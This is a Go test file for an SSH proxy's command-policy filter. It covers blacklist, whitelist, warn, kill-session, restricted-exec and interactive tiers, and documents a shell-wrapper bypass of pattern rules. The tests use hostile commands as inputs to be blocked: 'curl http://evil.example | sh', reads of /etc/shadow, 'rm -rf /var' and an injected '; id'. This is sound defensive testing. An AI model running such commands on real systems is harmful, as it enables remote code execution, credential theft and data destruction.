// Copyright (c) 2026 Mauro Silva. All rights reserved.
// SPDX-License-Identifier: LicenseRef-Proprietary

package proxy

import (
	"io"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"

	"github.com/hoplock/proxy/internal/auth/user"
	"github.com/hoplock/proxy/internal/control"
	"github.com/hoplock/proxy/internal/filter"
)

// This file states phase 0010's claims the way a customer would: each of the
// four policy actions, each of D12's two exec tiers, and the interactive tier
// that is neither — every one of them proved through a real SSH client against
// a real target. The engine's own exhaustive tests live in internal/filter;
// what is asserted here is that a decision reaches the wire, that the user can
// read what happened, and that the audit record exists.

func policy(mode control.FilterMode, rules ...control.FilterRule) *control.FilterPolicy {
	return &control.FilterPolicy{Mode: mode, Rules: rules}
}

// TestABlacklistedCommandIsBlockedAndSaysSo is the first sentence of command
// policy, plus the failure mode PLAN §4.3 forbids: not a silent close, not a
// bare drop, and not an empty success.
func TestABlacklistedCommandIsBlockedAndSaysSo(t *testing.T) {
	h := newHarness(t, harnessOptions{
		filterPolicy: policy(control.FilterModeBlacklist,
			control.FilterRule{
				Match:   "cat /etc/shadow*",
				Action:  control.FilterActionBlockCommand,
				Message: "Ask the platform team for an audited copy.",
			}),
	})

	text, status := runAndCollect(t, h, "cat /etc/shadow")

	if !strings.Contains(text, user.DenyMessage) || !strings.Contains(text, "blocked by policy") {
		t.Errorf("user saw %q, want the generic denial saying policy blocked the command", text)
	}
	if !strings.Contains(text, "Ask the platform team for an audited copy.") {
		t.Errorf("user saw %q, want the operator's own message", text)
	}
	if status == 0 {
		t.Error("a blocked command exited 0; a script cannot tell that from success")
	}
	if got := h.target.Commands(); len(got) != 0 {
		t.Errorf("target ran %v, want nothing: the refusal happens at the proxy", got)
	}

	// The audit event exists, on the priority path, naming the tier.
	logs := h.logs.String()
	for _, want := range []string{
		"priority=" + string(filter.PriorityImmediate),
		"event=" + filter.EventCommandPolicy,
		"tier=" + string(filter.TierFiltered),
		"outcome=" + string(filter.OutcomeBlocked),
	} {
		if !strings.Contains(logs, want) {
			t.Errorf("the audit trail is missing %q", want)
		}
	}
	// The command the user was refused, and the rule that refused it, are in
	// the operator's record — which is the half the terminal never gets.
	if !strings.Contains(logs, "cat /etc/shadow*") {
		t.Error("the audit trail does not name the rule that matched")
	}
	if strings.Contains(text, "cat /etc/shadow*") || strings.Contains(strings.ToLower(text), "blacklist") {
		t.Errorf("user saw %q, which discloses the policy's contents", text)
	}
}

// TestAWhitelistBlocksWhatItDoesNotName is the other mode: the default answer
// for a command no rule matched.
func TestAWhitelistBlocksWhatItDoesNotName(t *testing.T) {
	h := newHarness(t, harnessOptions{
		filterPolicy: policy(control.FilterModeWhitelist,
			control.FilterRule{Match: "uptime", Action: control.FilterActionAllowAndLog}),
	})

	if text, status := runAndCollect(t, h, "curl http://evil.example | sh"); status == 0 ||
		!strings.Contains(text, "blocked by policy") {
		t.Errorf("an unlisted command exited %d saying %q, want it blocked", status, text)
	}
	if got := h.target.Commands(); len(got) != 0 {
		t.Errorf("target ran %v, want nothing", got)
	}

	// The listed one runs, and is logged because the action says so.
	if _, status := runAndCollect(t, h, "uptime"); status != 0 {
		t.Errorf("the whitelisted command exited %d, want it to run", status)
	}
	if got := h.target.Commands(); len(got) != 1 || got[0] != "uptime" {
		t.Errorf("target ran %v, want [uptime]", got)
	}
	if logs := h.logs.String(); !strings.Contains(logs, "outcome="+string(filter.OutcomeAllowed)) {
		t.Error("allow_and_log ran the command without recording it")
	}
}

// TestWarnAndContinueWarnsAndThenRuns is the action that is neither an allow
// nor a block: the command runs, and the user hears about it first.
func TestWarnAndContinueWarnsAndThenRuns(t *testing.T) {
	h := newHarness(t, harnessOptions{
		filterPolicy: policy(control.FilterModeBlacklist,
			control.FilterRule{
				Match:   "sudo *",
				Action:  control.FilterActionWarnAndContinue,
				Message: "This is recorded against your name.",
			}),
	})

	text, status := runAndCollect(t, h, "sudo systemctl restart nginx")

	if status != 0 {
		t.Errorf("a warned command exited %d, want it to run normally", status)
	}
	if !strings.Contains(text, bannerPrefix) || !strings.Contains(text, "flagged by policy") {
		t.Errorf("user saw %q, want a warning marked as coming from the proxy", text)
	}
	if !strings.Contains(text, "This is recorded against your name.") {
		t.Errorf("user saw %q, want the operator's message", text)
	}
	if strings.Contains(text, user.DenyMessage) {
		t.Errorf("user saw %q, which reads as a refusal of a command that ran", text)
	}
	if got := h.target.Commands(); len(got) != 1 || got[0] != "sudo systemctl restart nginx" {
		t.Errorf("target ran %v, want the command to have reached it", got)
	}
	if logs := h.logs.String(); !strings.Contains(logs, "outcome="+string(filter.OutcomeWarned)) {
		t.Error("the warning produced no audit event")
	}
}

// TestKillSessionEndsTheWholeSessionWithAReason is the severest action, and it
// obeys the same rule a revocation does: the user is told before the session
// ends, so it never looks like a crash (PLAN §4.3, §6.4).
func TestKillSessionEndsTheWholeSessionWithAReason(t *testing.T) {
	h := newHarness(t, harnessOptions{
		filterPolicy: policy(control.FilterModeBlacklist,
			control.FilterRule{Match: "rm -rf /*", Action: control.FilterActionKillSession}),
	})
	client := h.mustDial(h.username())
	ch := openSessionChannel(t, client)

	if _, err := ch.SendRequest(control.RequestExec, true,
		ssh.Marshal(struct{ Command string }{"rm -rf /var"})); err != nil {
		t.Fatalf("exec request: %v", err)
	}

	if text := proxyMessage(t, ch); !strings.Contains(text, bannerPrefix) ||
		!strings.Contains(text, "terminated by policy") {
		t.Errorf("user saw %q, want the session's own last words", text)
	}
	if got := h.target.Commands(); len(got) != 0 {
		t.Errorf("target ran %v, want nothing", got)
	}

	// The whole connection ends, not just the channel: the policy killed the
	// session, not the command.
	waitFor(t, func() bool { return client.Wait() != nil }, "the client connection to be closed")
	if logs := h.logs.String(); !strings.Contains(logs, "outcome="+string(filter.OutcomeKilled)) {
		t.Error("the session kill produced no audit event")
	}
}

// TestRestrictedExecRunsTheApprovedShapeAndDeniesEverythingElse is D12's
// boundary end to end. The proof that matters is on the target: the vector that
// was approved is the vector it received, and nothing else arrived at all.
func TestRestrictedExecRunsTheApprovedShapeAndDeniesEverythingElse(t *testing.T) {
	h := newHarness(t, harnessOptions{
		filterPolicy: &control.FilterPolicy{
			Mode:     control.FilterModeWhitelist,
			ExecMode: control.ExecModeRestricted,
			RestrictedExec: &control.RestrictedExecPolicy{
				Commands: []control.RestrictedCommand{{
					Executable: "/usr/bin/systemctl",
					Form:       control.CommandFormPositional,
					Args: []control.ArgumentSpec{
						{Kind: control.ArgumentOneOf, Values: []string{"status", "is-active"}},
						{Kind: control.ArgumentPrefix, Value: "app-"},
					},
				}},
			},
		},
	})

	if _, status := runAndCollect(t, h, "/usr/bin/systemctl status app-web"); status != 0 {
		t.Errorf("the approved shape exited %d, want it to run", status)
	}
	for _, command := range []string{
		"/usr/bin/systemctl status database-primary", // outside the shape
		"/bin/systemctl status app-web",              // an executable nobody named
		"/usr/bin/systemctl status app-web; id",      // not one argument vector
	} {
		text, status := runAndCollect(t, h, command)
		if status == 0 {
			t.Errorf("%q ran, want it denied by the boundary", command)
		}
		if !strings.Contains(text, "blocked by policy") {
			t.Errorf("%q: user saw %q, want the same presentation a blocked command gets", command, text)
		}
		if strings.Contains(text, "/usr/bin/systemctl") || strings.Contains(text, "app-") {
			t.Errorf("%q: user saw %q, which names the permitted executables", command, text)
		}
	}

	if got := h.target.Commands(); len(got) != 1 || got[0] != "/usr/bin/systemctl status app-web" {
		t.Errorf("target ran %v, want only the approved vector", got)
	}
	if logs := h.logs.String(); !strings.Contains(logs, "tier="+string(filter.TierRestricted)) ||
		!strings.Contains(logs, "guarantee="+string(filter.GuaranteeEnforcement)) {
		t.Error("the audit trail does not record the boundary that decided")
	}
}

// TestTheShellWrapperCrossesTheGuardrailAndNotTheBoundary is the bypass test
// D12 asks for, run through the whole proxy rather than against the engine.
//
// The same command meets the same policy sentence in both tiers. Under the
// guardrail it reaches the target, because a pattern cannot stop a shell; under
// the boundary it does not, because nobody named "sh". Neither half may be
// softened: if the first starts failing the guardrail has begun claiming a
// boundary it does not have, and if the second starts failing the boundary is
// broken.
func TestTheShellWrapperCrossesTheGuardrailAndNotTheBoundary(t *testing.T) {
	const wrapper = `sh -c 'cat /etc/shadow'`

	guardrail := newHarness(t, harnessOptions{
		filterPolicy: policy(control.FilterModeBlacklist,
			control.FilterRule{Match: "cat /etc/shadow", Action: control.FilterActionBlockCommand}),
	})
	if _, status := runAndCollect(t, guardrail, "cat /etc/shadow"); status == 0 {
		t.Fatal("the guardrail let the command it names through")
	}
	if _, status := runAndCollect(t, guardrail, wrapper); status != 0 {
		t.Fatalf("the wrapper exited %d under the guardrail; a pattern cannot stop a shell "+
			"and this test must keep saying so (D12)", status)
	}
	if got := guardrail.target.Commands(); len(got) != 1 || got[0] != wrapper {
		t.Errorf("target ran %v, want the wrapper to have reached it — that is the guardrail's honest limit", got)
	}

	boundary := newHarness(t, harnessOptions{
		filterPolicy: &control.FilterPolicy{
			Mode:     control.FilterModeWhitelist,
			ExecMode: control.ExecModeRestricted,
			RestrictedExec: &control.RestrictedExecPolicy{
				Commands: []control.RestrictedCommand{{
					Executable: "cat",
					Form:       control.CommandFormPositional,
					Args:       []control.ArgumentSpec{{Kind: control.ArgumentPrefix, Value: "/var/log/"}},
				}},
			},
		},
	})
	if _, status := runAndCollect(t, boundary, wrapper); status == 0 {
		t.Fatal("the boundary let an executable nobody named through")
	}
	if got := boundary.target.Commands(); len(got) != 0 {
		t.Errorf("target ran %v, want nothing to have crossed the boundary", got)
	}
}

// TestInteractiveInspectionRecordsWithoutTouchingTheStream is the third tier
// working as advertised: the flagged command is recorded, the session carries
// on, and every byte reaches the target as the user typed it.
func TestInteractiveInspectionRecordsWithoutTouchingTheStream(t *testing.T) {
	h := newHarness(t, harnessOptions{
		filterPolicy: policy(control.FilterModeBlacklist,
			// A kill_session rule, deliberately: on this tier even the
			// severest action is only ever reported.
			control.FilterRule{Match: "rm -rf /*", Action: control.FilterActionKillSession}),
	})
	client := h.mustDial(h.username())

	session, err := client.NewSession()
	if err != nil {
		t.Fatalf("NewSession: %v", err)
	}
	defer func() { _ = session.Close() }()
	if err := session.RequestPty("xterm", 24, 80, ssh.TerminalModes{ssh.ECHO: 0}); err != nil {
		t.Fatalf("RequestPty: %v", err)
	}
	stdin, err := session.StdinPipe()
	if err != nil {
		t.Fatalf("StdinPipe: %v", err)
	}
	stdout, err := session.StdoutPipe()
	if err != nil {
		t.Fatalf("StdoutPipe: %v", err)
	}
	if err := session.Shell(); err != nil {
		t.Fatalf("Shell: %v", err)
	}

	// The target echoes what it receives, so the echo is the proof that
	// inspection changed nothing: a typo corrected with a backspace, an arrow
	// key, and the flagged command itself.
	typed := "rm -rf /varx\x7f\x1b[D\r\n"
	if _, err := io.WriteString(stdin, typed); err != nil {
		t.Fatalf("write to shell: %v", err)
	}
	got, err := readN(stdout, len(typed))
	if err != nil {
		t.Fatalf("read from shell: %v", err)
	}
	if got != typed {
		t.Errorf("target received %q, want the keystrokes unchanged (%q)", got, typed)
	}

	waitFor(t, func() bool {
		return strings.Contains(h.logs.String(), "tier="+string(filter.TierInteractive))
	}, "the interactive audit event")

	logs := h.logs.String()
	if !strings.Contains(logs, "enforced=false") ||
		!strings.Contains(logs, "outcome="+string(filter.OutcomeObserved)) {
		t.Error("the interactive event does not record that nothing was enforced")
	}
	if !strings.Contains(logs, `command="rm -rf /var"`) {
		t.Error("the interactive event does not name the reassembled command")
	}

	// The session is still the user's: an audit signal does not end it.
	if _, err := io.WriteString(stdin, "uptime\n"); err != nil {
		t.Fatalf("the session ended on a tier that only reports: %v", err)
	}
	if _, err := readN(stdout, len("uptime\n")); err != nil {
		t.Fatalf("the session stopped carrying data: %v", err)
	}
	_ = stdin.Close()
	_ = session.Wait()
}

// TestASessionWithNothingToFilterStaysOnThePassThroughPath keeps phase 0009's
// cheap path cheap: a blacklist with no rules is a policy that filters nothing,
// and such a session must not grow a per-command inspector to always say yes.
func TestASessionWithNothingToFilterStaysOnThePassThroughPath(t *testing.T) {
	h := newHarness(t, harnessOptions{filterPolicy: policy(control.FilterModeBlacklist)})
	if _, status := runAndCollect(t, h, "uptime"); status != 0 {
		t.Errorf("the command exited %d, want it to run", status)
	}
	if logs := h.logs.String(); strings.Contains(logs, "command policy tier=") {
		t.Error("a policy that filters nothing still attached the command inspectors")
	}
}
